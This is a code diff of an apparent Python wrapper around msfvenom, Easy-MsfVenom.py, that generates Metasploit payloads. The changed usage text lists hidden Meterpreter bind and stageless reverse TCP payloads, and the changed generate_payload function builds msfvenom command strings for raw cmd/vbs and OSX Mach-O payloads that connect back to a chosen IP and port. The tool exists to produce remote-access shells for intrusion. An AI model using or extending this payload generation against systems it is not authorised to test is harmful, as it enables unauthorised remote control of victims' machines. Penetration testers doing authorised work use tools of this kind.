@@ -37,10 +37,8 @@ Classics:
 
 Custom search:
 ---------------
-    -  Powershell payloads   ./Easy-MsfVenom.py -k powershell
-    -  Hidden Meterpreter Windows(x86) Bind_TCP payloads : ./Easy-MsfVenom.py  -t win -m -k hidden
-    
-
+   -  Hidden Meterpreter Windows(x86) Bind_TCP payloads : ./Easy-MsfVenom.py  -t win -m -k hidden
+   
 Full control:
 ------------
     - Meterpreter Win(x64) Stageless Reverse_TCP payloads:  ./Easy-MsfVenom.py  -t win -a x64 -m -s -r -p 4444
@@ -119,6 +117,7 @@ def generate_payload(params,number,avail_payloads):
     print(params)
     
     payload_cmd =avail_payloads[number].split()[0]
+    
     # If we have broadened the search :
     # reverse payload could have been chosen instead of the original bind one
     # Stageless payload could also have been chosen instead of original staged one
@@ -134,14 +133,14 @@ def generate_payload(params,number,avail_payloads):
         
     
     if "cmd/" in payload_cmd or "vbs" in payload_cmd:
-        print("[EXPERIMENTAL] Try to process payload..")
-        K_FORMAT = "raw"
-        payload="msfvenom -p {} {}={} LPORT={} -f {} ".format(payload_cmd,HOST, IP,PORT,K_FORMAT)       
+        K_TYPE=""
+        print(Green("[EXPERIMENTAL] Try to process payload.."))
+        payload="msfvenom -p {} {}={} LPORT={} -f raw".format(payload_cmd,HOST, IP,PORT)       
     
     if "osx/" in payload_cmd:
-        print("[EXPERIMENTAL] Try to process OSX payload..")
-        K_FORMAT = "macho"
-        payload="msfvenom -p {} {}={} LPORT={} -f {} -o {}".format(payload_cmd,HOST, IP,PORT,K_FORMAT, pname + "." + K_FORMAT)
+        print(Green("[EXPERIMENTAL] Try to process OSX payload.."))
+        K_TYPE=""
+        payload="msfvenom -p {} {}={} LPORT={} -f macho -o {}".format(payload_cmd,HOST, IP,PORT,pname + ".macho")
     
     if args.SHELL_TYPE == "web":
         K_FORMAT = K_EXT if K_EXT != "jsp" else "raw"
